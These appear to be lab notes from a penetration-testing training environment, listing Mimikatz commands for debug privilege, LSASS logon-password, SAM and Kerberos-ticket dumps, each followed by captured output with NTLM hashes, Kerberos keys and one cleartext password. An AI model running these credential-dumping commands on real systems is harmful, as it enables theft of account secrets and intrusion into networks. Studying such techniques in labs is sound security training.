debug on
```
privilege::debug
```

logonpasswords
```
sekurlsa::logonpasswords
```

```
Authentication Id : 0 ; 331740 (00000000:00050fdc)
Session           : Interactive from 1
User Name         : joe
Domain            : MEDTECH
Logon Server      : DC01
Logon Time        : 4/8/2024 12:07:00 PM
SID               : S-1-5-21-976142013-3766213998-138799841-1106
        msv :
         [00000003] Primary
         * Username : joe
         * Domain   : MEDTECH
         * NTLM     : 08d7a47a6f9f66b97b1bae4178747494
         * SHA1     : a0c2285bfad20cc614e2d361d6246579843557cd
         * DPAPI    : 58de53296298ce0f98087ae902c88735
        tspkg :
        wdigest :
         * Username : joe
         * Domain   : MEDTECH
         * Password : (null)
        kerberos :
         * Username : joe
         * Domain   : MEDTECH.COM
         * Password : (null)
        ssp :
        credman :
        cloudap :
```

sam dump
```
lsadump::sam
```

```
RID  : 000003e8 (1000)
User : offsec
  Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : f5c00983aa20003f714f787f65a83903

* Primary:Kerberos-Newer-Keys *
    Default Salt : WIN-LV5NL5EF060offsec
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : bd1f8259da72ba3b7b8ff1d5fe53cb305022ecabbba5d8a9a29054bc14c62f69
      aes128_hmac       (4096) : 677e69758f2afe35b2b00108d52e7adf
      des_cbc_md5       (4096) : 61452fbad3e0c48c

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WIN-LV5NL5EF060offsec
    Credentials
      des_cbc_md5       : 61452fbad3e0c48c
```


tickets dump
```
sekurlsa::tickets
```

```
Authentication Id : 0 ; 283887 (00000000:000454ef)
Session           : Service from 0
User Name         : joe
Domain            : MEDTECH
Logon Server      : DC01
Logon Time        : 4/8/2024 12:06:58 PM
SID               : S-1-5-21-976142013-3766213998-138799841-1106

         * Username : joe
         * Domain   : MEDTECH.COM
         * Password : Flowers1

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
```